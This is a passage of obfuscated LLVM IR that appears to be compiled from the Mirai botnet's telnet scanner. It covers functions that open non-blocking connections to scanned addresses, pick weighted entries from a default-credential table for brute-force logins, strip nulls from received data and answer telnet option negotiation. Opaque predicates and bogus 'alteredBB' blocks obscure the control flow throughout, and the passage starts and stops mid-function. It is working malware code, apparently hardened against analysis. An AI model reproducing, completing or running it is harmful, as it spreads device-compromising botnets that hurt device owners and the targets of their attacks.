  %33 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %32, i32 0, i32 7
  %34 = getelementptr inbounds [256 x i8], [256 x i8]* %33, i32 0, i32 0
  call void @util_zero(i8* %34, i32 256)
  %35 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %36 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %35, i32 0, i32 1
  %37 = load i32, i32* %36, align 8
  %38 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %39 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %38, i32 0, i32 1
  %40 = load i32, i32* %39, align 8
  %41 = call i32 (i32, i32, ...) @fcntl(i32 %40, i32 3, i32 0)
  %42 = or i32 2048, %41
  %43 = call i32 (i32, i32, ...) @fcntl(i32 %37, i32 4, i32 %42)
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %44, align 4
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %46 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %45, i32 0, i32 4
  %47 = load i32, i32* %46, align 4
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %48, i32 0, i32 0
  store i32 %47, i32* %49, align 4
  %50 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %51 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %50, i32 0, i32 5
  %52 = load i16, i16* %51, align 8
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %52, i16* %53, align 2
  %54 = load i32, i32* @fake_time, align 4
  %55 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %56 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %55, i32 0, i32 2
  store i32 %54, i32* %56, align 4
  %57 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %58 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %57, i32 0, i32 3
  store i32 1, i32* %58, align 8
  %59 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %60 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %59, i32 0, i32 1
  %61 = load i32, i32* %60, align 8
  %62 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %63 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %63, %struct.sockaddr** %62, align 8
  %64 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %65 = load %struct.sockaddr*, %struct.sockaddr** %64, align 8
  %66 = call i32 @connect(i32 %61, %struct.sockaddr* %65, i32 16)
  %67 = load i32, i32* @x.59
  %68 = load i32, i32* @y.60
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %75

; <label>:75:                                     ; preds = %originalBBpart2, %20
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %21
  %76 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %77 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %76, i32 0, i32 6
  store i32 0, i32* %77, align 4
  %78 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %79 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %78, i32 0, i32 7
  %80 = getelementptr inbounds [256 x i8], [256 x i8]* %79, i32 0, i32 0
  call void @util_zero(i8* %80, i32 256)
  %81 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %82 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %81, i32 0, i32 1
  %83 = load i32, i32* %82, align 8
  %84 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %85 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %84, i32 0, i32 1
  %86 = load i32, i32* %85, align 8
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i32 0)
  %_ = shl i32 2048, %87
  %88 = or i32 2048, %87
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %83, i32 4, i32 %88)
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %90, align 4
  %91 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %92 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %91, i32 0, i32 4
  %93 = load i32, i32* %92, align 4
  %94 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %95 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %94, i32 0, i32 0
  store i32 %93, i32* %95, align 4
  %96 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %97 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %96, i32 0, i32 5
  %98 = load i16, i16* %97, align 8
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %98, i16* %99, align 2
  %100 = load i32, i32* @fake_time, align 4
  %101 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %102 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %101, i32 0, i32 2
  store i32 %100, i32* %102, align 4
  %103 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %104 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %103, i32 0, i32 3
  store i32 1, i32* %104, align 8
  %105 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %106 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %105, i32 0, i32 1
  %107 = load i32, i32* %106, align 8
  %108 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %109 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %109, %struct.sockaddr** %108, align 8
  %110 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %111 = load %struct.sockaddr*, %struct.sockaddr** %110, align 8
  %112 = call i32 @connect(i32 %107, %struct.sockaddr* %111, i32 16)
  br label %originalBB
}

declare i32 @select(i32, %struct.fd_set.30*, %struct.fd_set.30*, %struct.fd_set.30*, %struct.timeval.31*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = load i32, i32* @x.61
  %2 = load i32, i32* @y.62
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca %struct.scanner_auth*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i16, align 2
  %12 = call i32 @rand_next()
  %13 = load i16, i16* @auth_table_max_weight, align 2
  %14 = zext i16 %13 to i32
  %15 = urem i32 %12, %14
  %16 = trunc i32 %15 to i16
  store i16 %16, i16* %11, align 2
  store i32 0, i32* %10, align 4
  %17 = load i32, i32* @x.61
  %18 = load i32, i32* @y.62
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %107, %originalBBpart2
  %26 = load i32, i32* %10, align 4
  %27 = load i32, i32* @auth_table_len, align 4
  %28 = icmp slt i32 %26, %27
  br i1 %28, label %29, label %110

; <label>:29:                                     ; preds = %25
  %30 = load i32, i32* @x.61
  %31 = load i32, i32* @y.62
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB12, label %originalBB12alteredBB

originalBB12:                                     ; preds = %originalBB12alteredBB, %29
  %38 = load i16, i16* %11, align 2
  %39 = zext i16 %38 to i32
  %40 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %41 = load i32, i32* %10, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %40, i64 %42
  %44 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %43, i32 0, i32 2
  %45 = load i16, i16* %44, align 8
  %46 = zext i16 %45 to i32
  %47 = icmp slt i32 %39, %46
  %48 = load i32, i32* @x.61
  %49 = load i32, i32* @y.62
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart214, label %originalBB12alteredBB

originalBBpart214:                                ; preds = %originalBB12
  br i1 %47, label %56, label %73

; <label>:56:                                     ; preds = %originalBBpart214
  %57 = load i32, i32* @x.61
  %58 = load i32, i32* @y.62
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %56
  %65 = load i32, i32* @x.61
  %66 = load i32, i32* @y.62
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %107

; <label>:73:                                     ; preds = %originalBBpart214
  %74 = load i16, i16* %11, align 2
  %75 = zext i16 %74 to i32
  %76 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %77 = load i32, i32* %10, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %76, i64 %78
  %80 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %79, i32 0, i32 3
  %81 = load i16, i16* %80, align 2
  %82 = zext i16 %81 to i32
  %83 = icmp slt i32 %75, %82
  br i1 %83, label %84, label %105

; <label>:84:                                     ; preds = %73
  %85 = load i32, i32* @x.61
  %86 = load i32, i32* @y.62
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %84
  %93 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %94 = load i32, i32* %10, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %93, i64 %95
  store %struct.scanner_auth* %96, %struct.scanner_auth** %9, align 8
  %97 = load i32, i32* @x.61
  %98 = load i32, i32* @y.62
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br label %111

; <label>:105:                                    ; preds = %73
  br label %106

; <label>:106:                                    ; preds = %105
  br label %107

; <label>:107:                                    ; preds = %106, %originalBBpart218
  %108 = load i32, i32* %10, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %10, align 4
  br label %25

; <label>:110:                                    ; preds = %25
  store %struct.scanner_auth* null, %struct.scanner_auth** %9, align 8
  br label %111

; <label>:111:                                    ; preds = %110, %originalBBpart222
  %112 = load i32, i32* @x.61
  %113 = load i32, i32* @y.62
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %111
  %120 = load %struct.scanner_auth*, %struct.scanner_auth** %9, align 8
  %121 = load i32, i32* @x.61
  %122 = load i32, i32* @y.62
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart226, label %originalBB24alteredBB

originalBBpart226:                                ; preds = %originalBB24
  ret %struct.scanner_auth* %120

originalBBalteredBB:                              ; preds = %originalBB, %0
  %129 = alloca %struct.scanner_auth*, align 8
  %130 = alloca i32, align 4
  %131 = alloca i16, align 2
  %132 = call i32 @rand_next()
  %133 = load i16, i16* @auth_table_max_weight, align 2
  %134 = zext i16 %133 to i32
  %_ = sub i32 %132, %134
  %gen = mul i32 %_, %134
  %_1 = shl i32 %132, %134
  %_2 = sub i32 0, %132
  %gen3 = add i32 %_2, %134
  %_4 = shl i32 %132, %134
  %_5 = sub i32 %132, %134
  %gen6 = mul i32 %_5, %134
  %_7 = shl i32 %132, %134
  %_8 = sub i32 %132, %134
  %gen9 = mul i32 %_8, %134
  %_10 = sub i32 %132, %134
  %gen11 = mul i32 %_10, %134
  %135 = urem i32 %132, %134
  %136 = trunc i32 %135 to i16
  store i16 %136, i16* %131, align 2
  store i32 0, i32* %130, align 4
  br label %originalBB

originalBB12alteredBB:                            ; preds = %originalBB12, %29
  %137 = load i16, i16* %11, align 2
  %138 = zext i16 %137 to i32
  %139 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %140 = load i32, i32* %10, align 4
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %139, i64 %141
  %143 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %142, i32 0, i32 2
  %144 = load i16, i16* %143, align 8
  %145 = zext i16 %144 to i32
  %146 = icmp slt i32 %138, %145
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %56
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %84
  %147 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %148 = load i32, i32* %10, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %147, i64 %149
  store %struct.scanner_auth* %150, %struct.scanner_auth** %9, align 8
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %111
  %151 = load %struct.scanner_auth*, %struct.scanner_auth** %9, align 8
  br label %originalBB24
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = load i32, i32* @x.63
  %6 = load i32, i32* @y.64
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  store i32 %3, i32* %16, align 4
  %19 = load i32, i32* %13, align 4
  %20 = load i8*, i8** %14, align 8
  %21 = load i32, i32* %15, align 4
  %22 = sext i32 %21 to i64
  %23 = load i32, i32* %16, align 4
  %24 = call i64 @recv(i32 %19, i8* %20, i64 %22, i32 %23)
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  %27 = icmp sgt i32 %26, 0
  %28 = load i32, i32* @x.63
  %29 = load i32, i32* @y.64
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %27, label %36, label %75

; <label>:36:                                     ; preds = %originalBBpart2
  store i32 0, i32* %18, align 4
  store i32 0, i32* %18, align 4
  br label %37

; <label>:37:                                     ; preds = %71, %36
  %38 = load i32, i32* %18, align 4
  %39 = load i32, i32* %17, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %74

; <label>:41:                                     ; preds = %37
  %42 = load i8*, i8** %14, align 8
  %43 = load i32, i32* %18, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %49, label %54

; <label>:49:                                     ; preds = %41
  %50 = load i8*, i8** %14, align 8
  %51 = load i32, i32* %18, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  store i8 65, i8* %53, align 1
  br label %54

; <label>:54:                                     ; preds = %49, %41
  %55 = load i32, i32* @x.63
  %56 = load i32, i32* @y.64
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %54
  %63 = load i32, i32* @x.63
  %64 = load i32, i32* @y.64
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %71

; <label>:71:                                     ; preds = %originalBBpart24
  %72 = load i32, i32* %18, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %18, align 4
  br label %37

; <label>:74:                                     ; preds = %37
  br label %75

; <label>:75:                                     ; preds = %74, %originalBBpart2
  %76 = load i32, i32* @x.63
  %77 = load i32, i32* @y.64
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %75
  %84 = load i32, i32* %17, align 4
  %85 = load i32, i32* @x.63
  %86 = load i32, i32* @y.64
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %84

originalBBalteredBB:                              ; preds = %originalBB, %4
  %93 = alloca i32, align 4
  %94 = alloca i8*, align 8
  %95 = alloca i32, align 4
  %96 = alloca i32, align 4
  %97 = alloca i32, align 4
  %98 = alloca i32, align 4
  store i32 %0, i32* %93, align 4
  store i8* %1, i8** %94, align 8
  store i32 %2, i32* %95, align 4
  store i32 %3, i32* %96, align 4
  %99 = load i32, i32* %93, align 4
  %100 = load i8*, i8** %94, align 8
  %101 = load i32, i32* %95, align 4
  %102 = sext i32 %101 to i64
  %103 = load i32, i32* %96, align 4
  %104 = call i64 @recv(i32 %99, i8* %100, i64 %102, i32 %103)
  %105 = trunc i64 %104 to i32
  store i32 %105, i32* %97, align 4
  %106 = load i32, i32* %97, align 4
  %107 = icmp sgt i32 %106, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %54
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %75
  %108 = load i32, i32* %17, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %originalBBpart228, %56, %1
  %12 = load i32, i32* @x.65
  %13 = load i32, i32* @y.66
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %11
  %20 = load i32, i32* %3, align 4
  %21 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %22 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %21, i32 0, i32 6
  %23 = load i32, i32* %22, align 4
  %24 = icmp slt i32 %20, %23
  %25 = load i32, i32* @x.65
  %26 = load i32, i32* @y.66
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %265

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i8*, i8** %4, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp ne i32 %36, 255
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %33
  br label %265

; <label>:39:                                     ; preds = %33
  %40 = load i8*, i8** %4, align 8
  %41 = load i8, i8* %40, align 1
  %42 = zext i8 %41 to i32
  %43 = icmp eq i32 %42, 255
  br i1 %43, label %44, label %231

; <label>:44:                                     ; preds = %39
  %45 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %46 = load i8*, i8** %4, align 8
  %47 = call signext i8 @can_consume(%struct.scanner_connection* %45, i8* %46, i32 1)
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %44
  br label %265

; <label>:50:                                     ; preds = %44
  %51 = load i8*, i8** %4, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 255
  br i1 %55, label %56, label %61

; <label>:56:                                     ; preds = %50
  %57 = load i8*, i8** %4, align 8
  %58 = getelementptr inbounds i8, i8* %57, i64 2
  store i8* %58, i8** %4, align 8
  %59 = load i32, i32* %3, align 4
  %60 = add nsw i32 %59, 2
  store i32 %60, i32* %3, align 4
  br label %11

; <label>:61:                                     ; preds = %50
  %62 = load i8*, i8** %4, align 8
  %63 = getelementptr inbounds i8, i8* %62, i64 1
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 253
  br i1 %66, label %67, label %161

; <label>:67:                                     ; preds = %61
  %68 = load i32, i32* @x.65
  %69 = load i32, i32* @y.66
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %67
  %76 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %76, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %77 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %77, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %78 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %79 = load i8*, i8** %4, align 8
  %80 = call signext i8 @can_consume(%struct.scanner_connection* %78, i8* %79, i32 2)
  %81 = icmp ne i8 %80, 0
  %82 = load i32, i32* @x.65
  %83 = load i32, i32* @y.66
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %81, label %107, label %90

; <label>:90:                                     ; preds = %originalBBpart24
  %91 = load i32, i32* @x.65
  %92 = load i32, i32* @y.66
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %90
  %99 = load i32, i32* @x.65
  %100 = load i32, i32* @y.66
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %265

; <label>:107:                                    ; preds = %originalBBpart24
  %108 = load i32, i32* @x.65
  %109 = load i32, i32* @y.66
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %107
  %116 = load i8*, i8** %4, align 8
  %117 = getelementptr inbounds i8, i8* %116, i64 2
  %118 = load i8, i8* %117, align 1
  %119 = zext i8 %118 to i32
  %120 = icmp ne i32 %119, 31
  %121 = load i32, i32* @x.65
  %122 = load i32, i32* @y.66
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %120, label %129, label %130

; <label>:129:                                    ; preds = %originalBBpart212
  br label %162

; <label>:130:                                    ; preds = %originalBBpart212
  %131 = load i32, i32* @x.65
  %132 = load i32, i32* @y.66
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %130
  %139 = load i8*, i8** %4, align 8
  %140 = getelementptr inbounds i8, i8* %139, i64 3
  store i8* %140, i8** %4, align 8
  %141 = load i32, i32* %3, align 4
  %142 = add nsw i32 %141, 3
  store i32 %142, i32* %3, align 4
  %143 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %144 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %143, i32 0, i32 1
  %145 = load i32, i32* %144, align 8
  %146 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %147 = call i64 @send(i32 %145, i8* %146, i64 3, i32 16384)
  %148 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %149 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %148, i32 0, i32 1
  %150 = load i32, i32* %149, align 8
  %151 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %152 = call i64 @send(i32 %150, i8* %151, i64 9, i32 16384)
  %153 = load i32, i32* @x.65
  %154 = load i32, i32* @y.66
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart216, label %originalBB14alteredBB

